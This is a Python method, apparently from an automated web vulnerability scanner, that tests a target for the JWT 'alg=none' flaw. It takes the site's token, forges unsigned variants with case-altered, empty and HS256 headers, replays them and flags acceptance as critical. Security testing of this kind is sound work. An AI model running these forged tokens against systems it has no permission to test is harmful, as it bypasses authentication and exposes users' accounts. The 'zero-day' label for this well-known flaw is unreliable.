    def test_zeroday_jwt_none_algorithm_comprehensive(self):
        """Zero-day #68 — JWT alg=none Comprehensive (15+ variants)."""
        if not self.deep: return
        self._print("[*]", "Zero-day: JWT none Algorithm...", "INFO")
        import base64, json as _json
        # Get existing JWT
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            payload = parts[1]
        except Exception: return
        none_variants = [
            {"alg": "none"},
            {"alg": "None"},
            {"alg": "NONE"},
            {"alg": "nOnE"},
            {"alg": "none", "typ": "JWT"},
            {"alg": ""},
            {"alg": "none", "kid": ""},
            {"alg": "HS256"},  # try HS256 with empty secret
        ]
        for header in none_variants:
            header_b64 = base64.urlsafe_b64encode(
                _json.dumps(header).encode()).decode().rstrip("=")
            evil_jwt = f"{header_b64}.{payload}."
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            if r2 and r2.status_code == 200:
                self._add_vuln(f"Zero-day JWT alg={header['alg']}",
                                "CRITICAL", self.target,
                                f"Server accepted JWT with alg={header['alg']}",
                                alg=header['alg'])

